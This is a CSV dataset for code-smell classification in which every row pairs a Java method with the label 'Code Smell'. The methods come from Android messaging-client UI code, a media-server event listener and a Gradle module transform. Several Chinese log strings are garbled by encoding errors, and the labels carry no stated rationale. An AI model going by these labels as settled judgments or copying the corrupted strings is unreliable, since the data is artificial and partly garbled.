text,label,text_label
"public static void loadChatParticipants(long chatId,int guid,String query,int offset,int count,Utilities.Callback<List<TLRPC.InputPeer>> onDone){
  MessagesController controller=MessagesController.getInstance(UserConfig.selectedAccount);
  ConnectionsManager connection=ConnectionsManager.getInstance(UserConfig.selectedAccount);
  TLRPC.TL_channels_getParticipants req=new TLRPC.TL_channels_getParticipants();
  req.channel=controller.getInputChannel(chatId);
  req.filter=query == null ? new TLRPC.TL_channelParticipantsRecent() : new TLRPC.TL_channelParticipantsSearch();
  req.filter.q=query == null ? """" : query;
  req.offset=offset;
  req.limit=count;
  int reqId=connection.sendRequest(req,(response,error) -> AndroidUtilities.runOnUIThread(() -> {
    if (response instanceof TLRPC.TL_channels_channelParticipants) {
      TLRPC.TL_channels_channelParticipants res=((TLRPC.TL_channels_channelParticipants)response);
      controller.putUsers(res.users,false);
      controller.putChats(res.chats,false);
      long selfId=UserConfig.getInstance(UserConfig.selectedAccount).getClientUserId();
      List<TLRPC.InputPeer> result=new ArrayList<>();
      for (int a=0; a < res.participants.size(); a++) {
        TLRPC.Peer peer=res.participants.get(a).peer;
        if (MessageObject.getPeerId(peer) != selfId) {
          TLRPC.User user=controller.getUser(peer.user_id);
          if (user != null && !UserObject.isDeleted(user) && !user.bot) {
            result.add(controller.getInputPeer(peer));
          }
        }
      }
      onDone.run(result);
    }
  }
));
}",1,Code Smell
"public boolean processSwitchButton(TLRPC.TL_keyboardButtonSwitchInline button){
  if (inlineReturn == 0 || button.same_peer || parentLayout == null) {
    return false;
  }
  String query=""@"" + currentUser.username + "" ""+ button.query;
  if (inlineReturn == dialog_id) {
    inlineReturn=0;
    chatActivityEnterView.setFieldText(query);
  }
 else {
    getMediaDataController().saveDraft(inlineReturn,0,query,null,null,false);
    if (parentLayout.getFragmentStack().size() > 1) {
      BaseFragment prevFragment=parentLayout.getFragmentStack().get(parentLayout.getFragmentStack().size() - 2);
      if (prevFragment instanceof ChatActivity && ((ChatActivity)prevFragment).dialog_id == inlineReturn) {
        finishFragment();
      }
 else {
        Bundle bundle=new Bundle();
        if (DialogObject.isEncryptedDialog(inlineReturn)) {
          bundle.putInt(""enc_id"",DialogObject.getEncryptedChatId(inlineReturn));
        }
 else         if (DialogObject.isUserDialog(inlineReturn)) {
          bundle.putLong(""user_id"",inlineReturn);
        }
 else {
          bundle.putLong(""chat_id"",-inlineReturn);
        }
        addToPulledDialogsMyself();
        presentFragment(new ChatActivity(bundle),true);
      }
    }
  }
  return true;
}",1,Code Smell
"private Animation getEnterAnimation(){
  Animation enterAnim;
  if (enterAnimResId == R.anim.anim_dialogx_default_enter && exitAnimResId == R.anim.anim_dialogx_default_exit && baseView() == null) {
switch (align) {
case TOP:
case TOP_CENTER:
case TOP_LEFT:
case TOP_RIGHT:
      enterAnimResId=R.anim.anim_dialogx_top_enter;
    exitAnimResId=R.anim.anim_dialogx_top_exit;
  break;
case BOTTOM:
case BOTTOM_CENTER:
case BOTTOM_LEFT:
case BOTTOM_RIGHT:
enterAnimResId=R.anim.anim_dialogx_bottom_enter;
exitAnimResId=R.anim.anim_dialogx_bottom_exit;
break;
case LEFT:
case LEFT_CENTER:
case LEFT_TOP:
case LEFT_BOTTOM:
enterAnimResId=R.anim.anim_dialogx_left_enter;
exitAnimResId=R.anim.anim_dialogx_left_exit;
break;
case RIGHT:
case RIGHT_CENTER:
case RIGHT_TOP:
case RIGHT_BOTTOM:
enterAnimResId=R.anim.anim_dialogx_right_enter;
exitAnimResId=R.anim.anim_dialogx_right_exit;
break;
}
enterAnim=AnimationUtils.loadAnimation(getOwnActivity(),enterAnimResId);
enterAnim.setInterpolator(new DecelerateInterpolator(2f));
}
 else {
int enterAnimResIdTemp=R.anim.anim_dialogx_default_enter;
if (overrideEnterAnimRes != 0) {
enterAnimResIdTemp=overrideEnterAnimRes;
}
if (enterAnimResId != 0) {
enterAnimResIdTemp=enterAnimResId;
}
enterAnim=AnimationUtils.loadAnimation(getOwnActivity(),enterAnimResIdTemp);
}
long enterAnimDurationTemp=enterAnim.getDuration();
if (overrideEnterDuration >= 0) {
enterAnimDurationTemp=overrideEnterDuration;
}
if (enterAnimDuration >= 0) {
enterAnimDurationTemp=enterAnimDuration;
}
enterAnim.setDuration(enterAnimDurationTemp);
return enterAnim;
}",1,Code Smell
"@Async(""taskExecutor"") @EventListener public void onApplicationEvent(MediaServerChangeEvent event){
  if (event.getMediaServerItemList() == null || event.getMediaServerItemList().isEmpty()) {
    return;
  }
  for (  MediaServer mediaServerItem : event.getMediaServerItemList()) {
    if (!type.equals(mediaServerItem.getType())) {
      continue;
    }
    logger.info(""[ZLM-娣诲姞寰呬笂绾胯妭鐐筣 ID锛"" + mediaServerItem.getId());
    offlineZlmPrimaryMap.put(mediaServerItem.getId(),mediaServerItem);
    offlineZlmTimeMap.put(mediaServerItem.getId(),System.currentTimeMillis());
    execute();
  }
}
@Async(""taskExecutor"") @EventListener public void onApplicationEvent(HookZlmServerStartEvent event){
  if (event.getMediaServerItem() == null || !type.equals(event.getMediaServerItem().getType()) || event.getMediaServerItem().isStatus()) {
    return;
  }
  MediaServer serverItem=mediaServerService.getOne(event.getMediaServerItem().getId());
  if (serverItem == null) {
    return;
  }
  logger.info(""[ZLM-HOOK浜嬩欢-鏈嶅姟鍚姩] ID锛"" + event.getMediaServerItem().getId());
  online(serverItem,null);
}
@Async(""taskExecutor"") @EventListener public void onApplicationEvent(HookZlmServerKeepaliveEvent event){
  if (event.getMediaServerItem() == null) {
    return;
  }
  MediaServer serverItem=mediaServerService.getOne(event.getMediaServerItem().getId());
  if (serverItem == null) {
    return;
  }
  logger.info(""[ZLM-HOOK浜嬩欢-蹇冭烦] ID锛"" + event.getMediaServerItem().getId());
  online(serverItem,null);
}
@Async(""taskExecutor"") @EventListener public void onApplicationEvent(MediaServerDeleteEvent event){
  if (event.getMediaServerId() == null) {
    return;
  }
  logger.info(""[ZLM-鑺傜偣琚Щ闄 ID锛"" + event.getMediaServerId());
  offlineZlmPrimaryMap.remove(event.getMediaServerId());
  offlineZlmsecondaryMap.remove(event.getMediaServerId());
  offlineZlmTimeMap.remove(event.getMediaServerId());
}
",1,Code Smell
"@Override public boolean onInterceptTouchEvent(MotionEvent ev){
switch (ev.getActionMasked()) {
case MotionEvent.ACTION_DOWN:
    initOrResetVelocityTracker();
  mVelocityTracker.addMovement(ev);
break;
case MotionEvent.ACTION_MOVE:
if (SCROLL_ORIENTATION != SCROLL_HORIZONTAL && (isIntercept || isIntercept(ev))) {
return true;
}
break;
case MotionEvent.ACTION_CANCEL:
case MotionEvent.ACTION_UP:
stopNestedScroll(ViewCompat.TYPE_TOUCH);
if (isBrake && SCROLL_ORIENTATION == SCROLL_NONE) {
return true;
}
break;
}
return super.onInterceptTouchEvent(ev);
}
",1,Code Smell
"private void onGetScreenCapImage(Device device,WView lastSelectView){
  try {
    if (device.getApiVersion() >= USE_TRANS_FILE_SDK_VERSION) {
      DeviceManager.executeCmd(project,new AdbCommand(new DeleteFileAction(TMP_TRANS_DATA_FILE_PATH),new DeleteFileAction(TMP_TRANS_IMAGE_FILE_PATH)),StringResponse.class);
    }
    final BroadcastAction broadcastAction=new BroadcastAction(ACTION_DEBUG_LAYOUT_INFO);
    broadcastAction.args(KEY_SAVE_TO_FILE,DeviceManager.isNeedSaveFile(project));
    broadcastAction.args(KEY_NEED_COLOR,mCodeLocatorWindow.getCodelocatorConfig().isPreviewColor());
    mApplicationResponse=DeviceManager.executeCmd(project,new AdbCommand(broadcastAction),ApplicationResponse.class);
    mApplication=mApplicationResponse.getData();
    if (mApplication == null || mApplication.getActivity() == null) {
      onGetApplicationInfoFailed();
      return;
    }
    if (allSameColor(mScreenCapImage)) {
      if (mApplication != null && mApplication.getActivity() != null && mApplication.getActivity().getDecorViews() != null && mApplication.getActivity().getDecorViews().size() > 0) {
        final List<WView> decorViews=mApplication.getActivity().getDecorViews();
        final WView wView=decorViews.get(0);
        final Image imageFromView=getImageFromView(wView);
        if (imageFromView != null) {
          mScreenCapImage=imageFromView;
        }
        calculateScaleScreenInfo();
        repaint();
      }
    }
    mApplication.setOverrideScreenWidth(device.getDeviceOverrideWidth());
    mApplication.setOverrideScreenHeight(device.getDeviceOverrideHeight());
    mApplication.setPhysicalWidth(device.getDeviceWidth());
    mApplication.setPhysicalHeight(device.getDeviceHeight());
    caclulateActivityInfo();
    mIsGrabbing=false;
    ThreadUtils.runOnUIThread(() -> {
      onGetApplicationInfoSuccess(lastSelectView);
    }
);
  }
 catch (  Throwable t) {
    Log.e(""鑾峰彇Activity淇℃伅澶辫触: "",t);
    mIsGrabbing=false;
    mApplicationResponse=null;
    mApplication=null;
    if (OnGetActivityInfoListener != null) {
      ThreadUtils.runOnUIThread(() -> {
        OnGetActivityInfoListener.onGetActivityInfoFailed(t);
        onClickViewChange(null);
      }
);
    }
  }
}",1,Code Smell
"public static int changeColorAccent(int themeBaseAccent,int accent,int color,boolean isDark){
  return changeColorAccent(themeBaseAccent,accent,color,isDark,color);
}
public static int changeColorAccent(int themeBaseAccent,int accent,int color,boolean isDark,int fallback){
  float[] hsvTemp3=getTempHsv(3);
  float[] hsvTemp4=getTempHsv(4);
  Color.colorToHSV(themeBaseAccent,hsvTemp3);
  Color.colorToHSV(accent,hsvTemp4);
  return changeColorAccent(hsvTemp3,hsvTemp4,color,isDark,fallback);
}
public static int changeColorAccent(ThemeInfo themeInfo,int accent,int color){
  if (accent == 0 || themeInfo.accentBaseColor == 0 || accent == themeInfo.accentBaseColor || themeInfo.firstAccentIsDefault && themeInfo.currentAccentId == DEFALT_THEME_ACCENT_ID) {
    return color;
  }
  float[] hsvTemp3=getTempHsv(3);
  float[] hsvTemp4=getTempHsv(4);
  Color.colorToHSV(themeInfo.accentBaseColor,hsvTemp3);
  Color.colorToHSV(accent,hsvTemp4);
  return changeColorAccent(hsvTemp3,hsvTemp4,color,themeInfo.isDark(),color);
}
public static int changeColorAccent(int color){
  ThemeAccent accent=currentTheme.getAccent(false);
  return changeColorAccent(currentTheme,accent != null ? accent.accentColor : 0,color);
}
public static int changeColorAccent(float[] baseHsv,float[] accentHsv,int color,boolean isDarkTheme,int fallback){
  if (tmpHSV5 == null) {
    tmpHSV5=new float[3];
  }
  float[] colorHsv=tmpHSV5;
  Color.colorToHSV(color,colorHsv);
  final float diffH=Math.min(abs(colorHsv[0] - baseHsv[0]),abs(colorHsv[0] - baseHsv[0] - 360f));
  if (diffH > 30f) {
    return fallback;
  }
  float dist=Math.min(1.5f * colorHsv[1] / baseHsv[1],1f);
  colorHsv[0]=colorHsv[0] + accentHsv[0] - baseHsv[0];
  colorHsv[1]=colorHsv[1] * accentHsv[1] / baseHsv[1];
  colorHsv[2]=colorHsv[2] * (1f - dist + dist * accentHsv[2] / baseHsv[2]);
  int newColor=Color.HSVToColor(Color.alpha(color),colorHsv);
  float origBrightness=AndroidUtilities.computePerceivedBrightness(color);
  float newBrightness=AndroidUtilities.computePerceivedBrightness(newColor);
  boolean needRevertBrightness=isDarkTheme ? origBrightness > newBrightness : origBrightness < newBrightness;
  if (needRevertBrightness) {
    float amountOfNew=0.6f;
    float fallbackAmount=(1f - amountOfNew) * origBrightness / newBrightness + amountOfNew;
    newColor=changeBrightness(newColor,fallbackAmount);
  }
  return newColor;
}",1,Code Smell
"@Override public boolean dispatchKeyEvent(@NonNull KeyEvent event){
  if (parentActivity == null) {
    return super.dispatchKeyEvent(event);
  }
  if (event.getAction() == KeyEvent.ACTION_DOWN && (event.getKeyCode() == KeyEvent.KEYCODE_VOLUME_UP || event.getKeyCode() == KeyEvent.KEYCODE_VOLUME_DOWN)) {
    if (VoIPService.getSharedInstance() != null) {
      if (Build.VERSION.SDK_INT >= 32) {
        boolean oldValue=WebRtcAudioTrack.isSpeakerMuted();
        AudioManager am=(AudioManager)parentActivity.getSystemService(AUDIO_SERVICE);
        int minVolume=am.getStreamMinVolume(AudioManager.STREAM_VOICE_CALL);
        boolean mute=am.getStreamVolume(AudioManager.STREAM_VOICE_CALL) == minVolume && event.getKeyCode() == KeyEvent.KEYCODE_VOLUME_DOWN;
        WebRtcAudioTrack.setSpeakerMute(mute);
        if (oldValue != WebRtcAudioTrack.isSpeakerMuted()) {
          getUndoView().showWithAction(0,mute ? UndoView.ACTION_VOIP_SOUND_MUTED : UndoView.ACTION_VOIP_SOUND_UNMUTED,null);
        }
      }
    }
  }
  return super.dispatchKeyEvent(event);
}",1,Code Smell
"private static void setLaterTime(long time){
  Log.i(TAG,""鑳介噺鎴愮啛鏃堕棿锛�"" + time);
  if (time > serverTime && serverTime > 0 && (laterTime < 0 || time < laterTime)) {
    laterTime=time;
    Log.i(TAG,laterTime - serverTime + ""ms 鍚庤兘閲忔垚鐔�"");
  }
}",1,Code Smell
"private static String formatInt(String decimal){
  BigDecimal bigDecimal=new BigDecimal(decimal).abs();
  if (bigDecimal.compareTo(BigDecimal.ZERO) == 0) {
    return """";
  }
  decimal=bigDecimal.toPlainString();
  StringBuilder stringBuilder=new StringBuilder();
  int j=0;
  for (int i=decimal.length() - 1; i >= 0; i--) {
    int n=decimal.charAt(i) - 48;
    String cn=CN_NUMBER[n];
    String un=UNITS1[j++];
    if (ObjectUtil.equals(0,n)) {
      if (StrUtil.isNotEmpty(stringBuilder) && !StrUtil.endWith(stringBuilder.toString(),CN_YUAN) && !StrUtil.endWith(stringBuilder.toString(),CN_ZERO)&& !StrUtil.endWith(stringBuilder.toString(),CN_TEN)&& !StrUtil.endWith(stringBuilder.toString(),CN_HUNDRED)&& !StrUtil.endWith(stringBuilder.toString(),CN_THOUSAND)&& !StrUtil.endWith(stringBuilder.toString(),CN_TEN_THOUSAND)) {
        stringBuilder.append(cn);
      }
      if (Arrays.asList(CN_YUAN,CN_TEN_THOUSAND).contains(un)) {
        stringBuilder.append(un);
      }
    }
 else {
      if (StrUtil.endWith(stringBuilder.toString(),CN_ZERO)) {
        stringBuilder=new StringBuilder(stringBuilder.substring(0,stringBuilder.length() - 1));
      }
      stringBuilder.append(un).append(cn);
    }
  }
  String str=stringBuilder.reverse().toString();
  if (str.endsWith(CN_ZERO)) {
    str=str.substring(0,str.length() - 1);
  }
  return str;
}",1,Code Smell
"private void cancelLoading(MessageObject messageObject){
  if (messageObject != null && !messageObject.mediaExists && !messageObject.putInDownloadsStore && !DownloadController.getInstance(currentAccount).isDownloading(messageObject.messageOwner.id)) {
    TLRPC.Document document=messageObject.getDocument();
    boolean loadDocumentFromImageReceiver=MessageObject.isStickerDocument(document) || MessageObject.isAnimatedStickerDocument(document,true) || MessageObject.isGifDocument(document)|| MessageObject.isRoundVideoDocument(document);
    if (!loadDocumentFromImageReceiver) {
      if (document != null) {
        FileLoader.getInstance(currentAccount).cancelLoadFile(document);
      }
 else {
        TLRPC.PhotoSize photo=FileLoader.getClosestPhotoSizeWithSize(messageObject.photoThumbs,AndroidUtilities.getPhotoSize());
        if (photo != null) {
          FileLoader.getInstance(currentAccount).cancelLoadFile(photo);
        }
      }
    }
  }
}
",1,Code Smell
"@Override public void transform(TransformOutputs outputs){
  Map<String,ModuleInfo> moduleInfo=getParameters().moduleInfo;
  Map<String,String> automaticModules=getParameters().automaticModules;
  File originalJar=getInputArtifact().get().getAsFile();
  String originalJarName=originalJar.getName();
  if ((isModule(originalJar) && !originalJarName.contains(""jackson"")) || originalJarName.startsWith(""javafx-"")) {
    outputs.file(originalJar);
  }
 else   if (moduleInfo.containsKey(originalJarName)) {
    addModuleDescriptor(originalJar,getModuleJar(outputs,originalJar),moduleInfo.get(originalJarName));
  }
 else   if (isAutoModule(originalJar)) {
    outputs.file(originalJar);
  }
 else   if (automaticModules.containsKey(originalJarName)) {
    addAutomaticModuleName(originalJar,getModuleJar(outputs,originalJar),automaticModules.get(originalJarName));
  }
 else   if (originalJarName.startsWith(""kotlin-stdlib-common"")) {
  }
 else {
    throw new RuntimeException(""Not a module and no mapping defined: "" + originalJarName);
  }
}
",1,Code Smell
